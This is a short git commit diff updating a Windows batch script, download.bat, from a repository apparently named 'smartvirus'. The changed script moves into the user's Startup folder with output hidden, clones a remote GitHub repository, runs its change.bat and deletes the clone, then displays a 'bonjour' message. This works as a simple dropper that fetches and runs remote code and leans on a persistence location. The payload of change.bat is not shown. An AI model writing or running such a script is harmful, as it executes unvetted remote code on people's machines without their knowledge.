26ecf264fd99a2cfb916f04a5fd197fa7c2f690b
mattis_tjn <mattis.tajan@ecoles-epsi.net>
2024-01-25 09:01:22 +0100

    Update download.bat

--- download.bat
+++ download.bat
@@ -1,4 +1,5 @@
-cd..
+echo off
+cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup
 timeout 2
 rmdir /s /q smartvirus
 git clone https://github.com/mattistjnn/smartvirus
@@ -6,5 +7,5 @@ cd smartvirus
 start change.bat
 cd ..
 rmdir /s /q smartvirus 
+pause
 msg * "bonjour"
-exit
